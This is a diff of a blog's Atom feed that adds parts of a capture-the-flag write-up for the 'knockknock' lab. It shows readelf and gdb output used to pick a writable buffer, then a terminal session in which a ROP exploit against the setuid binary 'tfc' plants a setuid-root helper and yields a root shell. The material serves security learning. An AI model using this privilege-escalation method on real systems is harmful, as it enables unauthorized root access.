@@ -4,7 +4,7 @@
   <title><![CDATA[staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-10-16T21:15:23+02:00</updated>
+  <updated>2014-10-16T21:28:51+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -260,7 +260,64 @@ write<span class="o">(</span>file1, <span class="p">&amp;</span>buf, sizeof<span
         <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
 
 
-<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -a ./tfc</code>. I picked this location, because it was writeable, had a decent number of bytes behind it and did not contain important code we need later on. For instace, <code>.got</code> is writeable, but we need the functions in there so we can&rsquo;t go and overwrite them, can we?!</p>
+<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -l ./tfc</code>:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc
+
+Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
+Entry point 0x8048500
+There are <span class="m">8</span> program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
+  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
+  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
+  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
+  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</code></pre></div>
+
+
+<p>Looks like there is some space in the DYNAMIC or LOAD sections. I fired up the binary in <code>gdb</code> to verify:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">Breakpoint 1, 0x08048927 in main <span class="o">()</span>
+gdb-peda<span class="nv">$ </span>x/400x 0x08049c54
+0x8049c54 &lt;_DYNAMIC&gt;: 0x00000001  0x00000010  0x0000000c  0x08048404
+0x8049c64 &lt;_DYNAMIC+16&gt;:  0x0000000d  0x08048a54  0x00000019  0x08049c48
+0x8049c74 &lt;_DYNAMIC+32&gt;:  0x0000001b  0x00000004  0x0000001a  0x08049c4c
+0x8049c84 &lt;_DYNAMIC+48&gt;:  0x0000001c  0x00000004  0x00000004  0x0804818c
+0x8049c94 &lt;_DYNAMIC+64&gt;:  0x6ffffef5  0x080481d8  0x00000005  0x080482d8
+0x8049ca4 &lt;_DYNAMIC+80&gt;:  0x00000006  0x080481f8  0x0000000a  0x00000087
+0x8049cb4 &lt;_DYNAMIC+96&gt;:  0x0000000b  0x00000010  0x00000015  0xf7715924
+0x8049cc4 &lt;_DYNAMIC+112&gt;: 0x00000003  0x08049d48  0x00000002  0x00000060
+0x8049cd4 &lt;_DYNAMIC+128&gt;: 0x00000014  0x00000011  0x00000017  0x080483a4
+0x8049ce4 &lt;_DYNAMIC+144&gt;: 0x00000011  0x0804839c  0x00000012  0x00000008
+0x8049cf4 &lt;_DYNAMIC+160&gt;: 0x00000013  0x00000008  0x6ffffffe  0x0804837c
+0x8049d04 &lt;_DYNAMIC+176&gt;: 0x6fffffff  0x00000001  0x6ffffff0  0x08048360
+0x8049d14 &lt;_DYNAMIC+192&gt;: 0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d24 &lt;_DYNAMIC+208&gt;: 0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d34 &lt;_DYNAMIC+224&gt;: 0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d44:  0x00000000  0x08049c54  0xf7715938  0xf77084a0
+0x8049d54 &lt;strcmp@got.plt&gt;:   0x08048446  0x08048456  0x08048466  0x08048476
+0x8049d64 &lt;puts@got.plt&gt;: 0x08048486  0x08048496  0x080484a6  0xf7545970
+0x8049d74 &lt;write@got.plt&gt;:    0x080484c6  0x080484d6  0x080484e6  0x080484f6
+0x8049d84:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d94:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8049da4 &lt;__dso_handle&gt;: 0x00000000  0x00000000  0x00000000  0x00000000
+0x8049db4 &lt;__dso_handle+16&gt;:  0x00000000  0x00000000  0x00000000  0x5f5f5f5f
+0x8049dc4 &lt;banr+4&gt;:   0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f
+0x8049dd4 &lt;banr+20&gt;:  0x5f5f5f5f  0x5f5f5f5f  0x205f5f5f  0x5c0a0d20
+0x8049de4 &lt;banr+36&gt;:  0x20205f5f  0x5f5f2020  0x5f5c2f5f  0x5f202020
+0x8049df4 &lt;banr+52&gt;:  0x5f5f5f5f  0x205f5c2f  0x5f5f2020  0x205c205f
+...
+0x8049fe4:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8049ff4:  0x00000000  0x00000000  0x00000000  Cannot access memory at address 0x804a000</code></pre></div>
+
+
+<p>We can&rsquo;t really use places like <code>0x8049d54</code>, because there are function pointers there, ones that we need! I picked this location at <code>0x8049db8</code>. It didn&rsquo;t look like it contained crucial information. Furthermore, it was writeable and had a decent number of bytes behind it.</p>
 
 <p>While we&rsquo;re at it, let&rsquo;s make sure we can read and write large files. Unfortunately, the buffer is only 0x200 bytes large. This means we have to chunk it up!</p>
 
@@ -357,6 +414,71 @@ write<span class="o">(</span>file1, <span class="p">&amp;</span>buf, sizeof<span
 
 
 <p>OK, so now our moment supreme:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
+</span><span class='line'>total 24
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c    
+</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>         <span class="c"># our little helper program</span>
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py       <span class="c"># the rop exploit</span>
+</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
+</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>python rop.py <span class="nb">read</span>                  <span class="c"># generate the ROP exploit using &#39;read&#39;</span>
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> <span class="nv">filesize</span> <span class="o">=</span> 4966
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> need <span class="m">10</span> iterations
+</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
+</span><span class='line'>total 32
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">4564</span> Oct <span class="m">16</span> 14:31 out.tfc      <span class="c"># this is the file we will feed to tfc</span>
+</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py
+</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
+</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc out.tfc pwned.tfc             <span class="c"># let&#39;s run the ROP exploit</span>
+</span><span class='line'>Segmentation fault
+</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
+</span><span class='line'>total 40
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason  <span class="m">109</span> Oct <span class="m">16</span> 14:31 getshell.c
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">4564</span> Oct <span class="m">16</span> 14:31 out.tfc
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root  jason    <span class="m">0</span> Oct <span class="m">16</span> 14:32 pwned.tfc
+</span><span class='line'>-rwxr-xr-x <span class="m">1</span> jason jason <span class="m">4966</span> Oct <span class="m">16</span> 14:31 <span class="nb">read</span>
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> jason jason <span class="m">1941</span> Oct <span class="m">16</span> 13:29 rop.py
+</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
+</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root  jason <span class="m">5120</span> Oct <span class="m">16</span> 14:32 write        <span class="c"># this is a copy of our helper program, but SETUID!</span>
+</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./write                             <span class="c"># let&#39;s give it a spin!</span>
+</span><span class='line'><span class="c"># whoami</span>
+</span><span class='line'>root                                                    <span class="c"># YEAHHH!!</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And picture-proof:</p>
 
 <p><img src="http://barrebas.github.io/assets/knockknock-rop.png" alt="" /></p>
 
